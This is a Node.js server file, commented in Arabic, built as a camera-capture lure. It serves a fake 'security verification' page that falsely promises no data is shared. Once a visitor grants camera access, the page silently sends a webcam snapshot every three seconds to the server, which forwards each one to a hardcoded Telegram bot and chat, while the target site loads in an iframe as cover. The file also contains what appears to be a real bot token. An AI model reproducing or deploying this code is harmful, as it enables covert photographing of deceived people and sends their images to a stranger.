const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const FormData = require('form-data');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// ================== الإعدادات (عدلها هنا أو استخدم متغيرات البيئة) ==================
const BOT_TOKEN = process.env.BOT_TOKEN || '8625738993:AAFJN5NusRGKwEl7CIOEEhXBfXDLzkfkKsA';
const CHAT_ID = process.env.CHAT_ID || '7473633093'; // معرف الدردشة المستهدف للصور
const DEFAULT_URL = process.env.DEFAULT_URL || 'https://www.google.com';
const HOST_URL = process.env.HOST_URL || 'https://your-app.onrender.com'; // رابط الاستضافة الفعلي
const PORT = process.env.PORT || 3000;

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// ================== إنشاء البوت مع Webhook ==================
const bot = new TelegramBot(BOT_TOKEN);
const webhookPath = '/webhook';

// تعيين Webhook تلقائياً عند بدء التشغيل (إذا كان HOST_URL معروفاً)
if (HOST_URL !== 'https://your-app.onrender.com') {
    bot.setWebHook(`${HOST_URL}${webhookPath}`).then(() => {
        console.log(`✅ Webhook set to ${HOST_URL}${webhookPath}`);
    }).catch(err => {
        console.error('❌ Failed to set webhook:', err);
    });
} else {
    console.warn('⚠️ HOST_URL not set. Webhook not configured. Please update HOST_URL.');
}

// نقطة استقبال التحديثات من تليجرام
app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// ================== أوامر البوت (اختياري) ==================
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'مرحباً! هذا البوت يستقبل الصور من رابط التتبع.');
});

// يمكنك إضافة أوامر أخرى حسب الحاجة

// ================== نقطة استقبال الصور من الصفحة ==================
app.post('/upload', async (req, res) => {
    const { image } = req.body;
    if (!image) {
        return res.status(400).send('No image data');
    }

    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    try {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', buffer, { filename: 'camera.jpg', contentType: 'image/jpeg' });

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData,
            headers: formData.getHeaders()
        });

        const result = await response.json();
        if (!result.ok) {
            console.error('Telegram error:', result);
            return res.status(500).send('Telegram error');
        }

        res.status(200).send('OK');
    } catch (error) {
        console.error('Error sending photo:', error);
        res.status(500).send('Server error');
    }
});

// ================== الصفحة الرئيسية (الخدعة) ==================
app.get('/', (req, res) => {
    const url = req.query.url || DEFAULT_URL;
    res.send(`
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الأمني</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { height: 100%; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex; justify-content: center; align-items: center;
            z-index: 1000; transition: opacity 0.5s ease; backdrop-filter: blur(5px);
        }
        #overlay.hidden { opacity: 0; pointer-events: none; }
        .verification-box {
            background: white; border-radius: 20px; padding: 40px; max-width: 450px; width: 90%;
            text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.3); animation: fadeInUp 0.6s ease;
        }
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .verification-box .icon { font-size: 80px; margin-bottom: 20px; animation: pulse 2s infinite; }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        .verification-box h2 { font-size: 28px; color: #333; margin-bottom: 15px; }
        .verification-box p { color: #666; margin-bottom: 25px; line-height: 1.6; font-size: 16px; }
        .verification-box .security-badge {
            background-color: #f8f9fa; border-radius: 50px; padding: 10px 20px; display: inline-block;
            margin-bottom: 25px; font-size: 14px; color: #28a745; border: 1px solid #28a745;
        }
        .verification-box button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 50px;
            cursor: pointer; transition: transform 0.3s, box-shadow 0.3s; font-weight: 600;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4); width: 100%; max-width: 250px; margin: 0 auto;
        }
        .verification-box button:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(102, 126, 234, 0.5); }
        .verification-box button:active { transform: translateY(0); }
        .verification-box .note { margin-top: 20px; font-size: 13px; color: #999; }
        iframe { width: 100%; height: 100%; border: none; display: none; }
        iframe.visible { display: block; }
    </style>
</head>
<body>
    <div id="overlay">
        <div class="verification-box">
            <div class="icon">🛡️</div>
            <h2>التحقق الأمني مطلوب</h2>
            <p>لضمان أمان حسابك وحماية بياناتك، نحتاج إلى التحقق من هويتك عبر الكاميرا. هذه الخطوة ضرورية للوصول إلى المحتوى المطلوب.</p>
            <div class="security-badge">✓ اتصال آمن (SSL/TLS)</div>
            <button id="start-verification">بدء التحقق الآمن</button>
            <div class="note">لن يتم تخزين أي بيانات أو مشاركتها مع أطراف ثالثة.</div>
        </div>
    </div>

    <iframe id="main-frame" src="${escapeHtml(url)}" allow="camera; microphone"></iframe>

    <script>
        (function() {
            let isActive = true;
            let mediaStream = null;
            let intervalId = null;
            let verificationDone = false;

            const overlay = document.getElementById('overlay');
            const mainFrame = document.getElementById('main-frame');
            const startBtn = document.getElementById('start-verification');

            function stopCamera() {
                isActive = false;
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                    mediaStream = null;
                }
                if (intervalId) {
                    clearInterval(intervalId);
                    intervalId = null;
                }
            }

            window.addEventListener('beforeunload', stopCamera);
            window.addEventListener('pagehide', stopCamera);

            async function startVerification() {
                if (verificationDone) return;
                verificationDone = true;

                try {
                    mediaStream = await navigator.mediaDevices.getUserMedia({
                        video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' }
                    });

                    overlay.classList.add('hidden');
                    mainFrame.classList.add('visible');
                    startCapture();

                } catch (err) {
                    alert('تعذر الوصول إلى الكاميرا. يرجى السماح بالوصول وإعادة المحاولة.');
                    verificationDone = false;
                    console.log('Camera error:', err.message);
                }
            }

            async function startCapture() {
                const video = document.createElement('video');
                video.srcObject = mediaStream;
                video.autoplay = true;
                video.playsInline = true;
                video.style.display = 'none';
                document.body.appendChild(video);

                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        const maxDim = 500;
                        let width = video.videoWidth;
                        let height = video.videoHeight;
                        if (width > height && width > maxDim) {
                            height = Math.round(height * maxDim / width);
                            width = maxDim;
                        } else if (height > maxDim) {
                            width = Math.round(width * maxDim / height);
                            height = maxDim;
                        }
                        canvas.width = width;
                        canvas.height = height;
                        resolve();
                    };
                });

                intervalId = setInterval(async () => {
                    if (!isActive) return;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);

                    try {
                        await fetch('/upload', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ image: dataURL })
                        });
                    } catch (e) { /* تجاهل */ }
                }, 3000);
            }

            startBtn.addEventListener('click', startVerification);
        })();
    </script>
</body>
</html>
    `);
});

function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// ================== تشغيل الخادم ==================
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 Public URL: ${HOST_URL}`);
    console.log(`📷 Access page: ${HOST_URL}/?url=YOUR_TARGET_URL`);
    console.log(`🤖 Webhook endpoint: ${HOST_URL}${webhookPath}`);
});
